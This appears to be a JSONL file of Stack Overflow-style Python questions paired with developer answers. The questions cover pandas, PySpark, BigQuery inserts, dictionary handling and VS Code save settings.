{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I add data to BigQuery without problems with rate limits?<p>I currently have a system in which I want to send data from that system via a Google Cloud Function to BigQuery (using Python). My idea was to do this in two simple steps:<\/p>\n<ol>\n<li>The system calls a Google Cloud Function and sends JSON data to that function<\/li>\n<li>The Google Cloud Function unpacks the data and stores it inside a Google BigQuery table using the pandas-gbq package.<\/li>\n<\/ol>\n<p>I thought it was a good idea, until I realized there were rate limits on Google BigQuery regarding adding data (see <a href=\"https:\/\/community.microstrategy.com\/s\/article\/Known-Limitations-of-Adding-Data-into-Google-BigQuery?language=en_US\" rel=\"nofollow noreferrer\">https:\/\/community.microstrategy.com\/s\/article\/Known-Limitations-of-Adding-Data-into-Google-BigQuery?language=en_US<\/a> for example).<\/p>\n<p>Because I want to use this system to trigger more than a thousand times a day, I think I need a better setup.<\/p>\n<p>What would you recommend me to do?<\/p>\n<p>I already thought of two things:<\/p>\n<ol>\n<li>Using Google Datastore for adding data, but I am not sure whether that has the same kind of rate limits and if I can easily transfer that data to BigQuery<\/li>\n<li>Instead of sending data on a case-by-case basis, collect (for example) 500 calls to a Google Cloud Function. Once the data of 500 cases is received, send those 500 cases in one go to BigQuery. I am not sure whether this will work and if it's even possible to do this with Google Cloud Functions.<\/li>\n<\/ol>","output_text":"<p>The <a href=\"https:\/\/cloud.google.com\/bigquery\/quotas#load_jobs\" rel=\"nofollow noreferrer\">mentioned limits<\/a> only apply to <em>load jobs<\/em>.<\/p>\n<p>You can use <a href=\"https:\/\/cloud.google.com\/bigquery\/docs\/samples\/bigquery-table-insert-rows\" rel=\"nofollow noreferrer\"><em>streaming inserts<\/em><\/a> instead, which do not have those <a href=\"https:\/\/cloud.google.com\/bigquery\/quotas#streaming_inserts\" rel=\"nofollow noreferrer\">limits<\/a>.<\/p>\n<p>I am not sure if <em>pandas-gbq<\/em> uses load jobs or streaming inserts under the hood.<br>\nAnyway, you can also use the <a href=\"https:\/\/googleapis.dev\/python\/bigquery\/latest\/index.html\" rel=\"nofollow noreferrer\">BigQuery Python Client<\/a> and the method <a href=\"https:\/\/googleapis.dev\/python\/bigquery\/latest\/generated\/google.cloud.bigquery.client.Client.html#google.cloud.bigquery.client.Client.insert_rows_from_dataframe\" rel=\"nofollow noreferrer\">insert_rows_from_dataframe<\/a> which uses the streaming API.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pandas dataframe to excel into multiple columns<p>When I convert my pandas dataframe into a csv it all puts it in one column, I would like it to be in multiple columns.<\/p>\n\n<p>this my code<\/p>\n\n<pre><code>df = pd.concat([data_2020, data_2019Q4, data_2019Q3, data_2019Q2, data_2019Q1, data_2018QH1, data_2017H1,\n                data_2016H1, data_2015H1])\n\nsplit_data = df[\"Date,Country,City,Specie,count,min,max,median,variance\"].str.split(\",\")\ndata = split_data.to_list()\nnames = ['Date', 'Country', 'City', 'Specie', 'count', 'min', 'max', 'median', 'variance']\nnew_df = pd.DataFrame(data, columns=names)\n\nnew_df.to_csv('concat_data1.csv', sep=\",\",header=None,columns=names)\n<\/code><\/pre>\n\n<p>Edit :<\/p>\n\n<p>Sample of my dataframe<\/p>\n\n<pre><code>               Date Country      City Specie count   min    max median variance\n0        2020-02-02      RS  Novi Sad   pm10    48   4.0   42.0   14.0   742.70\n1        2020-02-05      RS  Novi Sad   pm10    48   5.0   21.0    9.0   115.46\n2        2020-02-24      RS  Novi Sad   pm10    48  10.0   99.0   27.0  3611.91\n3        2020-03-02      RS  Novi Sad   pm10    41   3.0   68.0   14.0  1515.22\n4        2020-05-09      RS  Novi Sad   pm10    36   9.0  102.0   15.0  5511.02\n<\/code><\/pre>","output_text":"<p>Worked by replacing the sep \",\" by \";\"<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Select key and one value out of tuples with multiple values per key to create new dictionary<p>I started recently with learning programming Python and I am running into a problem.\nI tried to solve this myself, unsuccessfully.<\/p>\n<p>I have a dictionary with a formatted string as a keys and tuples with 3 values per key.<\/p>\n<p>dict1 = { \u201ca;2;1;1;\u201d : ( 1, 2, 3), \u201ca;3;2;1;\u201d : ( 4, 5, 6)}<\/p>\n<p>I want to create en new dictionary dict2 with all keys from dict1 and only the third value from each key.<\/p>\n<p>dict2 = { \u201ca;2;1;1;\u201d : 3, \u201ca;3;2;1;\u201d : 6}<\/p>\n<p>In these examples I used only a two key-value pair, the real dictionary has ten thousands of key-value pairs.<\/p>\n<p>Any suggestions?\nHelp is appreciated.<\/p>","output_text":"<p>Do it with a simple iteration:<\/p>\n<pre><code>dict2 = dict()\nfor k in dict1:\n    dict2[k] = dict1[k][2]\n<\/code><\/pre>\n<p>Or use a dict-comprehension to do it in a single line:<\/p>\n<pre><code>dict2 = {k: dict1[k][2] for k in dict1}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I assign points\/score based on word detection in a dataframe?<p>im new to python and trying to learn word detection. I have a dataframe with words<\/p>\n<pre><code>sharina['transcript']\nOut[25]: \n0      thank you for calling my name is Tiffany and we want to let you know this call is recorded...\n1                                                Maggie \n2                                  through the time \n3      that you can find I have a question about a claim and our contact is..\n4                       three to like even your box box and thank you for your help...\n<\/code><\/pre>\n<p>I have created an app that detects words from this:<\/p>\n<pre><code>def search_multiple_strings_in_file(file_name, list_of_strings):\n    &quot;&quot;&quot;Get line from the file along with line numbers, which contains any string from the list&quot;&quot;&quot;\n    line_number = 0\n    list_of_results = []\n    # Open the file in read only mode\n    with open(&quot;sharina.csv&quot;, 'r') as read_obj:\n        # Read all lines in the file one by one\n        for line in read_obj:\n            line_number += 1\n            # For each line, check if line contains any string from the list of strings\n            for string_to_search in list_of_strings:\n                if string_to_search in line:\n                    # If any string is found in line, then append that line along with line number in list\n                    list_of_results.append((string_to_search, line_number, line.rstrip()))\n \n    # Return list of tuples containing matched string, line numbers and lines where string is found\n    return list_of_results\n\n# search for given strings in the file 'sample.txt'\n\nmatched_lines = search_multiple_strings_in_file('sharina.csv', ['recorded','thank'])\n \nprint('Total Matched lines : ', len(matched_lines))\nfor elem in matched_lines:\n    print('Word = ', elem[0], ' :: Line Number = ', elem[1], ' :: Line = ', elem[2])\n<\/code><\/pre>\n<p>I want to assign a score if certain words are detected in the dataframe, for example<\/p>\n<p>if the word 'recorded' has been mentioned = 7 points\nif the word 'thank' has been mentioned = 5 points<\/p>\n<p>and then the output gives the summation of the total points\/score = 12 in this case. How can i do this?<\/p>","output_text":"<p>Since you mention that you already have a DataFrame:<\/p>\n<p>This can be done relatively simply with <code>Series.str.extractall<\/code>. First, we create the capturing group, which is a <code>'|'.join<\/code> of all the words, sandwiched between parentheses. This allows you to grab all of the desired words in one Series, with the index of that Series indicative of the row it belonged to. There is also a 'match' index level of that Series that indicates the number of items that matched on that row, not really important in this case.<\/p>\n<pre><code>pat = '(' + '|'.join(words) + ')'\n#'(recorded|thank)'\n\ndf['transcript'].str.extractall(pat)\n#                0\n#  match          \n#0 0         thank     # `'thank'` on line 0\n#  1      recorded\n#4 0         thank     # `'thank'` also on line 4\n<\/code><\/pre>\n<p>If you want to assign points, a good organization would be a dict, let the keys be the words, the values be the points. Then you can make the pattern by joining the keys, and get the points by mapping the values:<\/p>\n<pre><code>d = {'thank': 5, 'recorded': 7}\npat = '(' + '|'.join(d.keys()) + ')'\n\ndf1 = df['transcript'].str.extractall(pat).rename(columns={0: 'word'})\ndf1['points'] = df1['word'].map(d)\n#             word  points\n#  match                  \n#0 0         thank       5\n#  1      recorded       7\n#4 0         thank       5\n<\/code><\/pre>\n<p>If you only want to count words once then drop_duplicates:<\/p>\n<pre><code>df1.drop_duplicates('word').points.sum()\n#12\n<\/code><\/pre>\n<hr \/>\n<h3>Setup Data<\/h3>\n<pre><code>df = pd.DataFrame({'transcript': \n                   ['thank you for calling my name is Tiffany and we want to let you know this call is recorded',\n                    'Maggie',\n                    'through the time',\n                    'that you can find I have a question about a claim and our contact is',\n                    'three to like even your box box and thank you for your help']})\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n probnorm function equivalent in pyspark<p>PROBNORM : explanation<\/p>\n<p>The PROBNORM function in SAS returns the probability that an observation from the standard normal distribution is less than or equal to x.<\/p>\n<p>Is there any equivalent function in pyspark?<\/p>","output_text":"<p>I'm afraid that in PySpark there is no such implemented method.<br \/>\nHowever, you can exploit <a href=\"https:\/\/spark.apache.org\/docs\/latest\/api\/python\/user_guide\/arrow_pandas.html#pandas-udfs-a-k-a-vectorized-udfs\" rel=\"nofollow noreferrer\">Pandas UDFs<\/a> to define your own custom function using basic Python packages! Here we are going to use <a href=\"https:\/\/docs.scipy.org\/doc\/scipy\/reference\/generated\/scipy.stats.norm.html\" rel=\"nofollow noreferrer\"><code>scipy.stats.norm<\/code><\/a> module to get cumulative probabilities from a standard normal distribution.<\/p>\n<p>Versions I'm using:<\/p>\n<ul>\n<li><code>Spark 3.1.1<\/code><\/li>\n<li><code>pandas 1.1.5<\/code><\/li>\n<li><code>scipy 1.5.2<\/code><\/li>\n<\/ul>\n<p><strong>Example code<\/strong><\/p>\n<pre><code>import pandas as pd\nfrom scipy.stats import norm\nimport pyspark.sql.functions as F\nfrom pyspark.sql.functions import pandas_udf\n\n\n# create sample data\ndf = spark.createDataFrame([\n    (1, 0.00),\n    (2, -1.23),\n    (3, 4.56),\n], ['id', 'value'])\n\n\n# define your custom Pandas UDF\n@pandas_udf('double')\ndef probnorm(s: pd.Series) -&gt; pd.Series:\n    return pd.Series(norm.cdf(s))\n\n\n# create a new column using the Pandas UDF\ndf = df.withColumn('pnorm', probnorm(F.col('value')))\n\n\ndf.show()\n\n+---+-----+-------------------+\n| id|value|              pnorm|\n+---+-----+-------------------+\n|  1|  0.0|                0.5|\n|  2|-1.23|0.10934855242569191|\n|  3| 4.56| 0.9999974423189606|\n+---+-----+-------------------+\n<\/code><\/pre>\n<hr \/>\n<h2>Edit<\/h2>\n<p>If you do not have <code>scipy<\/code> properly installed on your workers too, you can use the Python base package <code>math<\/code> and a little bit of <a href=\"https:\/\/en.wikipedia.org\/wiki\/Normal_distribution\" rel=\"nofollow noreferrer\">statistics knowledge<\/a>.<\/p>\n<pre><code>import math\nfrom pyspark.sql.functions import udf\n\ndef normal_cdf(x, mu=0, sigma=1):\n    &quot;&quot;&quot;\n    Cumulative distribution function for the normal distribution\n    with mean `mu` and standard deviation `sigma`\n    &quot;&quot;&quot;\n    return (1 + math.erf((x - mu) \/ (sigma * math.sqrt(2)))) \/ 2\n\nmy_udf = udf(normal_cdf)\n\ndf = df.withColumn('pnorm', my_udf(F.col('value')))\n\ndf.show()\n\n+---+-----+-------------------+\n| id|value|              pnorm|\n+---+-----+-------------------+\n|  1|  0.0|                0.5|\n|  2|-1.23|0.10934855242569197|\n|  3| 4.56| 0.9999974423189606|\n+---+-----+-------------------+\n<\/code><\/pre>\n<p>Results are in fact the same.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Return the next 4 lines after a match has been found<p>Hope you guys can help. I am currently learning python and stumped by this challenge I have set myself. <\/p>\n\n<p>I have a file1 with approx 1000 lines of text like this:  <\/p>\n\n<pre><code>1 6  \n4 6  \n1 4  \n2 4  \n1 5  \n4 6  \n3 6  \n1 3  \n2 4  \n..etc etc\n<\/code><\/pre>\n\n<p>I have another file2 with 4 (or more) lines of text like this:  <\/p>\n\n<pre><code>4 6  \n1 4  \n2 4  \n1 5  \n<\/code><\/pre>\n\n<p>I am trying to find the exact match in file1 with the 4 lines of text in file2 and then return the next 4 lines that follow the match in file1. So in the above example, the return would read:  <\/p>\n\n<pre><code>4 6  \n3 6  \n1 3  \n2 4  \n<\/code><\/pre>\n\n<p>The problem I am having is trying to search for the 4 lines in file1. A single file is easy. I am thinking it will be done using loops but the more I try the cloudier my head becomes! <\/p>\n\n<p>The closest I have come is this code:<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>textfile = ('results.txt', 'wt')\nfile1 = open(\"small_sample.txt\", \"r\")\nfile2 = open(\"demo.txt\", \"r\")\nfile3 = open(\"results.txt\", \"a\")\nlist1 = file1.readlines()\nlist2 = file2.readlines()\nfile3.write(\"The following entries appear in both lists: \\n\")\nfor i in list1:\n    for j in list2:\n        if i==j:\n            file3.write(i)\n<\/code><\/pre>","output_text":"<p>you can use:<\/p>\n\n<pre><code>with  open('file1.txt', 'r') as fp:\n    t1 = '\\n'.join(l.strip() for l in fp.readlines()) # eliminate extra spaces\n\nwith  open('file2.txt', 'r') as fp:\n    t2 = '\\n'.join(l.strip() for l in fp.readlines())\n\n\none_row_length = len(t1.split('\\n', 1)[0]) + 1 # 1 represents \\n new line character\nhow_many_rows_after = 4 * one_row_length\nend_first_match = t1.index(t2) + len(t2) + 1\nprint(t1[end_first_match : end_first_match + how_many_rows_after])\n<\/code><\/pre>\n\n<p>output:<\/p>\n\n<pre><code>4 6\n3 6\n1 3\n2 4\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Sorting column of numerical string data in pandas<p>I have a column of about 100 values; mixed integers and decimals (eg <code>27<\/code>, <code>27.2<\/code>, <code>28<\/code>) but they're stored as datatype string (eg <code>'27'<\/code>, <code>'27.2'<\/code>, <code>'28'<\/code>). The data was compiled from multiple sources and some of those compiling the data did not have the precision necessary for the decimal values and so entered data with '&gt;' or &quot;&lt;' characters. So add a <code>'&gt;27'<\/code> to the example column:<\/p>\n<pre><code>col_1\n27\n&gt;27\n27.2\n28\n<\/code><\/pre>\n<p>The values are out of sort and I would like to sort them from lowest to highest and convert them back to datatype string. My solution is to convert everything to a float, sort on the numerical values and then convert everything back but the values without precision are getting in the way.\nMy thinking was to add characters to the end of those values, say <code>'.001'<\/code>, and removing the &quot;&gt;&quot; and &quot;&lt;&quot; characters before converting, sorting, and then converting everything back. So, when doing the operation to add <code>'0.001'<\/code> to the string value I do this:<\/p>\n<pre><code>df['col_1'].loc[df['col_1].str.contains('&gt;')] = df['col_1'].loc[df['col_1].str.contains('&gt;')] + '.001'\n<\/code><\/pre>\n<p>Is there a better, more acceptable, or maybe more efficient way to do this?<\/p>","output_text":"<p>Here is one way to approach the problem<\/p>\n<pre><code>s = df['col_1'].str.extract(r'(&lt;|&gt;)?(.*)')\ns[0], s[1] = s[0].fillna('='), s[1].astype(float)\n\ndf_new = df.loc[s.sort_values([1, 0]).index]\n<\/code><\/pre>\n<p>Step by step details<\/p>\n<ol>\n<li>Extract symbols and numbers<\/li>\n<\/ol>\n<pre><code>&gt;&gt;&gt; s\n\n     0     1\n0  NaN    27\n1    &gt;    27\n2  NaN  27.2\n3  NaN    28\n4    &lt;    27\n<\/code><\/pre>\n<ol start=\"2\">\n<li>Fill the <code>NaN<\/code> values in column <code>0<\/code> with <code>=<\/code>, since <code>&lt;<\/code> &lt; <code>=<\/code> &lt; <code>&gt;<\/code>. Then change the <code>dtype<\/code> of column  <code>1<\/code> to <code>float<\/code><\/li>\n<\/ol>\n<pre><code>&gt;&gt;&gt; s\n\n   0     1\n0  =  27.0\n1  &gt;  27.0\n2  =  27.2\n3  =  28.0\n4  &lt;  27.0\n<\/code><\/pre>\n<ol start=\"3\">\n<li>Sort the above dataframe and get the sorted index, then use the sorted index to sort the given dataframe<\/li>\n<\/ol>\n<pre><code>&gt;&gt;&gt; df_new\n\n  col_1\n4   &lt;27\n0    27\n1   &gt;27\n2  27.2\n3    28\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Vs code takes a very long time to save a python file on mac<p>Vs code takes a very long time to save a python file, (see the two images below, it takes around 30 seconds for each in a 60-line python file). It is also laggy when writing code.<\/p>\n<p>Any recommendations on how to avoid this?<\/p>\n<p>My vs code specs:<\/p>\n<pre><code>Version: 1.69.2 (Universal)\nCommit: 3b889b090b5ad5793f524b5d1d39fda662b96a2a\nDate: 2022-07-18T16:12:57.074Z (2 wks ago)\nElectron: 18.3.5\nChromium: 100.0.4896.160\nNode.js: 16.13.2\nV8: 10.0.139.17-electron.0\nOS: Darwin x64 20.4.0\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/RqnZP.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/RqnZP.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/LAt7c.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/LAt7c.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>My activity monitor looks like this:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/ggb4o.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/ggb4o.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>And these are my mac specs:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/5py3z.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/5py3z.png\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>The reason for this problem is probably because VS code sorts the imported packages and formats the codes first when saving the file.<\/p>\n<p>You should turn off these features, then the time to save the file will be greatly reduced.<\/p>\n<p>Add the following configuration to the <strong>settings.json<\/strong> to turn off these two functions:<\/p>\n<pre class=\"lang-json prettyprint-override\"><code>    &quot;editor.formatOnSave&quot;: false,\n    &quot;editor.codeActionsOnSave&quot;: {\n        &quot;source.organizeImports&quot;: false\n    }\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Create two new data frames from two existing data frames, taking into account all combinations of their multi-index columns and their values<p>I want to create two new data frames from two existing data frames, taking into account all combinations of their multi-index columns and their values.<\/p>\n<pre><code>left = pd.DataFrame(([1,0,1], [1,0,0],[1,0,1],), columns=pd.MultiIndex.from_tuples([('A', 'B'), ('A', 'C' ), ('D','D'),]))\nright = pd.DataFrame(([8,9], [8,9],[8,9],), columns=pd.MultiIndex.from_tuples([('S', 'T'), ('Y', 'Z'),]))\n<\/code><\/pre>\n<h6>left:<\/h6>\n<pre><code>   A  A  D\n   B  C  D\n0  1  0  1\n1  1  0  0\n2  1  0  1\n<\/code><\/pre>\n<h6>right:<\/h6>\n<pre><code>   S  Y\n   T  Z\n0  8  9\n1  8  9\n2  8  9\n<\/code><\/pre>\n<h5>expected output<\/h5>\n<h6>left_result:<\/h6>\n<pre><code>   A  A  A  A  D  D\n   B  B  C  C  D  D\n0  1  1  0  0  1  1\n1  1  1  0  0  0  0\n2  1  1  0  0  1  1\n<\/code><\/pre>\n<h6>right_result:<\/h6>\n<pre><code>   S  Y  S  Y  S  Y\n   T  Z  T  Z  T  Z\n0  8  9  8  9  8  9\n1  8  9  8  9  8  9\n2  8  9  8  9  8  9\n<\/code><\/pre>\n<p><em>PS: Sorry if my question is not precise enough, but the example with the expected result still explains it best without words. Perhaps the question has already been asked, but in the absence of a precise description of what kind of result I actually want (combination in two DataFrames?), I ask you to help formulate the question more precisely or to link it as a duplicate if an existing question is present.<\/em><\/p>","output_text":"<p>We can use <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.MultiIndex.from_product.html\" rel=\"nofollow noreferrer\"><code>MultiIndex.from_product<\/code><\/a> based on the <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.MultiIndex.to_flat_index.html\" rel=\"nofollow noreferrer\">flat index<\/a> of each DataFrame then <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.DataFrame.reindex.html\" rel=\"nofollow noreferrer\"><code>reindex<\/code><\/a> based on the corresponding <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.Index.get_level_values.html\" rel=\"nofollow noreferrer\">level values<\/a>:<\/p>\n<pre><code>midx = pd.MultiIndex.from_product([left.columns.to_flat_index(),\n                                   right.columns.to_flat_index()])\n\nleft = left.reindex(columns=midx.get_level_values(0))\nright = right.reindex(columns=midx.get_level_values(1))\n<\/code><\/pre>\n<p><code>left<\/code>:<\/p>\n<pre><code>   A           D   \n   B  B  C  C  D  D\n0  1  1  0  0  1  1\n1  1  1  0  0  0  0\n2  1  1  0  0  1  1\n<\/code><\/pre>\n<p><code>right<\/code>:<\/p>\n<pre><code>   S  Y  S  Y  S  Y\n   T  Z  T  Z  T  Z\n0  8  9  8  9  8  9\n1  8  9  8  9  8  9\n2  8  9  8  9  8  9\n<\/code><\/pre>\n<hr \/>\n<p><code>midx<\/code> for reference:<\/p>\n<pre><code>MultiIndex([(('A', 'B'), ('S', 'T')),\n            (('A', 'B'), ('Y', 'Z')),\n            (('A', 'C'), ('S', 'T')),\n            (('A', 'C'), ('Y', 'Z')),\n            (('D', 'D'), ('S', 'T')),\n            (('D', 'D'), ('Y', 'Z'))],\n           )\n<\/code><\/pre>\n<p>Note: level 0 are the <code>left<\/code> flat index values and level 1 are the <code>right<\/code> flat index values.<\/p>"}
